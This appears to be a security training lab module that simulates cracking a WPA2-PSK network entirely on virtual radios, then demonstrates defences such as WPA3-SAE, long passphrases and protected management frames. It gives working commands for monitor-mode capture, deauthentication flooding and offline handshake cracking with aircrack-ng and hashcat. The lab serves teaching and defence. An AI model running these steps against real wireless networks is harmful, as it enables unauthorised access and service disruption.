---
title: "Scenario 10 - Wireless entry: cracking WPA2-PSK (no radio, all simulated)"
---

# Scenario 10 - Wireless entry: cracking WPA2-PSK (no radio, all simulated)

> **Journey:** "Hack a Network" - module 10 of the series.
> **Ethics / scope:** this module is **fully self-contained on the Kali VM**. It uses the Linux kernel's
> virtual-radio driver `mac80211_hwsim` to fake the access point, the victim laptop, and the attacker.
> **No real Wi-Fi hardware, no real airwaves, nothing leaves the VM.** Capturing or deauthenticating a
> Wi-Fi network you do not own is a crime; here every "device" is a virtual radio we created. A real USB
> Wi-Fi adapter can be USB-passed-through later for authentic RF, but you do not need one to learn the
> attack and its defence.

| | |
|---|---|
| **Goal** | Stand up a fake "neighbour" WPA2-PSK access point with a deliberately weak passphrase, capture its 4-way handshake, crack it offline against `rockyou`, and then learn the wireless defences that kill this attack. |
| **Target** | A virtual WPA2-PSK AP you run on Kali itself (SSID `Neighbour_5G`). No external target. |
| **Difficulty** | Beginner (every command given verbatim). |
| **Est. time** | 25-40 min (most of it the offline crack). |
| **Prereqs** | Kali `10.13.37.10` (`kali`/`kali`), aircrack-ng suite, hashcat, hostapd, wpa_supplicant, `hcxtools`, `rockyou.txt.gz`. All present on the `tools-ready` snapshot. |
| **Start-from** | Kali snapshot `tools-ready`. You need a root shell (`sudo -i` or prefix with `sudo`). This exercise does not touch any other VM. |

## MITRE ATT&CK mapping
| Technique | ID | Where in this module |
|---|---|---|
| Network Sniffing | T1040 | Monitor-mode capture of 802.11 frames |
| Network Denial of Service (deauth) | T1498 | `aireplay-ng --deauth` to force a re-handshake |
| Brute Force: Password Cracking | T1110.002 | Offline crack of the PMKID/handshake with a wordlist |
| Valid Accounts (the recovered PSK) | T1078 | The cracked passphrase is the key to the LAN (leads into module 01/02) |

---

## A note on the radio count (accuracy)
The lab primitive is `sudo modprobe mac80211_hwsim radios=2` - two virtual adapters, one to be the AP and
one to be the attacker. But a WPA 4-way handshake **only exists when a station (a client) connects to the
AP**: with just an AP and a silent sniffer there is nothing to capture and nothing to deauth. So this
module loads **`radios=3`** and gives each virtual radio a clear role:

| Interface | Role | Runs |
|---|---|---|
| `wlan0` | the neighbour's home AP | `hostapd` |
| `wlan1` | the neighbour's laptop (victim client) | `wpa_supplicant` |
| `wlan2` | **you**, the attacker | `airodump-ng` + `aireplay-ng` |

All `mac80211_hwsim` radios share one virtual medium by default, so `wlan2` hears the traffic between
`wlan0` and `wlan1` exactly as a real attacker in radio range would.

---

## Steps (attacker view, run on Kali, as root)

### 1. Create the virtual radios
```
sudo modprobe mac80211_hwsim radios=3
iw dev
```
**What it does:** loads the software-radio driver and creates three fake wireless interfaces.
**What you should see:** `iw dev` lists `wlan0`, `wlan1`, `wlan2`, each on its own `phy`.

### 2. Stop interference from the system's own Wi-Fi services
```
sudo airmon-ng check kill
```
**What it does:** stops NetworkManager, `wpa_supplicant`, and any `dhclient` that would otherwise grab
the new interfaces and fight you for them.
**What you should see:** a short list of killed processes (or nothing). This is harmless in this exercise
because the module is self-contained; restore NetworkManager in Cleanup at the end.

### 3. Bring up the "neighbour" access point (weak passphrase, on purpose)
Write a minimal `hostapd.conf`:
```
cat > /tmp/hostapd.conf <<'EOF'
interface=wlan0
driver=nl80211
ssid=Neighbour_5G
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
# Deliberately weak: this passphrase is in rockyou.txt. Never do this on a real AP.
wpa_passphrase=password1
EOF

sudo hostapd /tmp/hostapd.conf
```
**What it does:** runs a real WPA2-PSK access point on the virtual radio `wlan0`.
**What you should see:** `wlan0: interface state UNINITIALIZED->ENABLED` and `wlan0: AP-ENABLED`. Leave
this terminal running; open a new terminal for the rest.

### 4. Connect the victim laptop (this is what produces a handshake)
The neighbour's own laptop knows its own Wi-Fi password. Connect `wlan1` as that client:
```
cat > /tmp/victim.conf <<'EOF'
network={
    ssid="Neighbour_5G"
    psk="password1"
}
EOF

sudo wpa_supplicant -i wlan1 -c /tmp/victim.conf -B
```
**What it does:** associates the victim client to the AP, performing the WPA 4-way handshake.
**What you should see:** in the hostapd terminal, `AP-STA-CONNECTED <wlan1 MAC>`. Note that MAC, it is the
client you will deauth. Confirm with `iw dev wlan1 link` -> `Connected to <AP BSSID>`.

### 5. Put the attacker radio into monitor mode
```
sudo airmon-ng start wlan2
```
**What it does:** switches `wlan2` to monitor mode so it can capture raw 802.11 frames.
**What you should see:** a new interface `wlan2mon` (name it prints; on some builds it stays `wlan2`).
Use whatever name it reports below.

### 6. Recon: find the AP's BSSID, channel, and connected client
```
sudo airodump-ng wlan2mon
```
**What it does:** lists nearby APs (top) and associated stations (bottom).
**What you should see:** `Neighbour_5G` with its **BSSID** and channel **6**, and under STATION the
victim's MAC associated to it. Press `Ctrl-C` and set variables for convenience:
```
export AP=<the Neighbour_5G BSSID>
export CLIENT=<the associated station MAC>
```

### 7. Targeted capture
```
sudo airodump-ng -c 6 --bssid $AP -w /tmp/cap wlan2mon
```
**What it does:** writes every frame for just this AP on channel 6 to `/tmp/cap-01.cap`. Leave it
running in this terminal.
**What you should see:** the AP and client rows. Top-right will show `WPA handshake:` only after you do
the next step.

### 8. Deauthenticate the client to force a fresh handshake
In another terminal:
```
sudo aireplay-ng --deauth 5 -a $AP -c $CLIENT wlan2mon
```
**What it does:** sends 5 deauth frames spoofing the AP, kicking the client off. `wpa_supplicant`
immediately reconnects, and its 4-way handshake is captured by the airodump in step 7.
**What you should see:** `Sending ... DeAuth`, then in the airodump-ng window (step 7) the top-right line
changes to **`WPA handshake: <AP BSSID>`**. You have the crackable material. You can `Ctrl-C` airodump now.

### 9. Crack it offline with aircrack-ng + rockyou
`rockyou` ships gzipped; expand it once:
```
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz    # -k keeps the .gz; makes rockyou.txt
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b $AP /tmp/cap-01.cap
```
**What it does:** derives the WPA key from each wordlist candidate and tests it against the captured
handshake, entirely offline (the AP never sees this).
**What you should see:** `KEY FOUND! [ password1 ]`. That recovered passphrase is **FLAG-WIFI**.

### 10. (Alternative) Crack with hashcat mode 22000
Modern workflow: convert the capture and use hashcat's WPA-PBKDF2/PMKID mode.
```
hcxpcapngtool -o /tmp/hash.hc22000 /tmp/cap-01.cap
hashcat -m 22000 /tmp/hash.hc22000 /usr/share/wordlists/rockyou.txt
```
**What it does:** `hcxpcapngtool` extracts the handshake into hashcat's `22000` format; hashcat cracks it
(GPU-accelerated if available, CPU otherwise).
**What you should see:** the hash line ending `:password1`, and `Status: Cracked`.

---

## Defense

WPA2-PSK's flaw is that the 4-way handshake lets an attacker test passwords **offline**, as fast as their
hardware allows, with no lockout and no contact with the AP. Four controls, in priority order:

### D1 - WPA3-SAE (kills offline cracking)
WPA3's SAE ("Dragonfly") handshake is a password-authenticated key exchange: capturing it gives the
attacker **nothing to test offline**. Each guess requires a fresh live exchange with the AP, which is
rate-limited and detectable. This is the real fix.

**Prove the fix:** switch the AP to WPA3-SAE and re-run the capture/crack. Edit `/tmp/hostapd.conf`:
```
wpa=2
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
ieee80211w=2          # PMF is mandatory for SAE
# (keep wpa_passphrase=password1 to show even a weak PW is not offline-crackable now)
```
Restart hostapd, reconnect the client with `key_mgmt=SAE` in `victim.conf`, deauth (see D3), and capture.
`aircrack-ng`/`hashcat` find **no WPA-PSK handshake** to crack: there is no PBKDF2 material in an SAE
exchange. FLAG-WIFI is uncapturable.

### D2 - A long, random passphrase not in any wordlist
Even on WPA2, the offline attack only works if the passphrase is guessable. A 20+ character random
passphrase is not in `rockyou` or any feasible wordlist.

**Prove the fix:** set `wpa_passphrase` to something like `7Qd!m2Xr9$Lp0Vz4Tn8Wc` (>= 20 random chars),
restart hostapd, reconnect the client with the same string, recapture the handshake, and re-run:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b $AP /tmp/cap-01.cap
```
**What you should see:** aircrack exhausts all ~14 million rockyou candidates and reports
`Passphrase not in dictionary` - the handshake is captured but uncracked.

### D3 - 802.11w / Protected Management Frames (blunts deauth)
The deauth in step 8 works because plain 802.11 management frames are unauthenticated. PMF (802.11w)
signs them, so a spoofed deauth is ignored and the attacker cannot cheaply force a re-handshake.

**Prove the fix:** add `ieee80211w=2` to `hostapd.conf` and `ieee80211w=2` to the client's `victim.conf`,
restart both, then re-run step 8's deauth. **What you should see:** the client stays connected, hostapd
does not log a disconnect, and no new `WPA handshake` line appears. (An attacker can still wait for a
natural connect, so PMF is a delay/detection control, not a substitute for D1/D2.)

### D4 - WPA-Enterprise (802.1X) for real networks
For anything beyond a home, drop the shared PSK entirely: WPA2/WPA3-Enterprise authenticates each user to
a RADIUS server with individual credentials or certificates, so there is no single passphrase to crack
and no shared key to leak. This is the correct control for offices and campuses; note it as the
"real network" answer even though the lab demonstrates the home-PSK case.

---

## Wrap-up

**Flags / evidence:** `FLAG-WIFI` = the recovered passphrase (`password1`). Evidence for the write-up:
the `WPA handshake:` line in airodump, the `KEY FOUND!` / hashcat `Cracked` output, and the D1/D2/D3
"prove the fix" re-runs showing the crack failing after hardening.

**Cleanup / reset (all on Kali, no VM revert needed):**
```
sudo pkill hostapd
sudo pkill wpa_supplicant
sudo pkill airodump-ng
sudo airmon-ng stop wlan2mon        # or: sudo iw dev wlan2mon del
sudo rmmod mac80211_hwsim           # removes all the virtual radios
sudo systemctl start NetworkManager # restore normal networking on Kali
rm -f /tmp/hostapd.conf /tmp/victim.conf /tmp/cap-01.* /tmp/hash.hc22000
```
Because this module never touched another VM, there is nothing to snapshot-revert.

**Go deeper: ** Research: In module 10, why can WPA3-SAE not be cracked offline the way WPA2-PSK can, even with the same weak passphrase?
